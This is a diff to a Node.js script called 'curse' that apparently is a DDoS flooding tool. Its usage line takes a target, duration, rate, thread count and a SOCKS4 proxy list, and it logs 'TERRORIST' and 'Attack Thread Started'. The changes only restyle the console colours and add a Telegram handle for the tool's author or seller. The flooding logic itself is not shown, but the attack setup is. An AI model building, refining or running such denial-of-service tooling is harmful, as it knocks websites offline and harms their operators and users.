@@ -15,7 +15,7 @@ require("events").EventEmitter.defaultMaxListeners = 0;
 process.on('uncaughtException', function (exception) {
 });
 
-if (process.argv.length < 7){console.log(`node curse target time rate(32) thread socks4.txt`); process.exit();}
+if (process.argv.length < 7){console.log(`\x1b[38;5;160mnode curse target time rate(\x1b[38;5;255m32\x1b[38;5;160m) thread socks4.txt \x1b[38;5;255m| \x1b[38;5;160mtelegram: \x1b[38;5;255m@xDAXG`); process.exit();}
 const headers = {};
  function readLines(filePath) {
     return fs.readFileSync(filePath, "utf-8").toString().split(/\r?\n/);
@@ -44,16 +44,16 @@ const getCurrentTime = () => {
  Promise.race([axiosPromise, timeoutPromise])
    .then((response) => {
      const { status, data } = response;
-     console.log(`[\x1b[38;5;160m35mTERRORIST ✅\x1b[0m] ${getCurrentTime()} Title: \x1b[38;5;160m${getTitleFromHTML(data)} (\x1b[32m${status}\x1b[0m)`);
+     console.log(`\x1b[38;5;255m[\x1b[38;5;160m35mTERRORIST ✅\x1b[38;5;255m] ${getCurrentTime()} Title: \x1b[38;5;160m${getTitleFromHTML(data)} \x1b[38;5;255m(\x1b[32m${status}\x1b[38;5;255m)`);
    })
    .catch((error) => {
      if (error.message === 'Request timed out') {
-       console.log(`[\x1b[38;5;160mTERRORIST ✅\x1b[0m] ${getCurrentTime()} \x1b[38;5;160mRequest Timed Out`);
+       console.log(`\x1b[38;5;255m[\x1b[38;5;160mTERRORIST ✅\x1b[38;5;255m] ${getCurrentTime()} \x1b[38;5;160mRequest Timed Out`);
      } else if (error.response) {
        const extractedTitle = getTitleFromHTML(error.response.data);
-       console.log(`[\x1b[38;5;160mTERRORIST ✅\x1b[0m] ${getCurrentTime()} Title: \x1b[38;5;160m${extractedTitle} (\x1b[31m${error.response.status}\x1b[0m)`);
+       console.log(`\x1b[38;5;255m[\x1b[38;5;160mTERRORIST ✅\x1b[38;5;255m] ${getCurrentTime()} Title: \x1b[38;5;160m${extractedTitle} (\x1b[31m${error.response.status}\x1b[0m)`);
      } else {
-       console.log(`[\x1b[38;5;160mTERRORIST ✅\x1b[0m] ${getCurrentTime()} ${error.message}`);
+       console.log(`\x1b[38;5;255m[\x1b[38;5;160mTERRORIST ✅\x1b[38;5;255m] ${getCurrentTime()} ${error.message}`);
      }
    });
 }
@@ -123,12 +123,12 @@ if (cluster.isMaster){
  
  for (let i = 1; i <= process.argv[5]; i++){
    cluster.fork();
-   console.log(`[\x1b[38;5;160mTERORIST ✅\x1b[0m] ${getCurrentTime()} \x1b[38;5;160mAttack Thread ${i} Started`);
+   console.log(`\x1b[38;5;255m[\x1b[38;5;160mTERORIST ✅\x1b[38;5;255m] ${getCurrentTime()} \x1b[38;5;160m\x1b[38;5;255mATTACK\x1b[38;5;160m Include: ${i} Thread(s) ${i} Started`);
  }
- console.log(`[\x1b[38;5;160mTERRORIST ✅\x1b[0m] ${getCurrentTime()} \x1b[38;5;160mThe Attack Has Started`);
+ console.log(`\x1b[38;5;255m[\x1b[38;5;160mTERRORIST ✅\x1b[38;5;255m] ${getCurrentTime()} \x1b[38;5;255mAttack\x1b[38;5;160m Has Been Started`);
  setInterval(getStatus, 2000);
  setTimeout(() => {
-   console.log(`[\x1b[38;5;160m35mTERRORIST ✅\x1b[0m] ${getCurrentTime()} \x1b[38;5;160mThe Attack Is Over`);
+   console.log(`\x1b[38;5;255m[\x1b[38;5;160mTERRORIST ✅\x1b[38;5;255m] ${getCurrentTime()} \x1b[38;5;160mThe \x1b[38;5;255mAttack\x1b[38;5;160m Is Over`);
    process.exit(1);
  }, process.argv[3] * 1000);
 } 
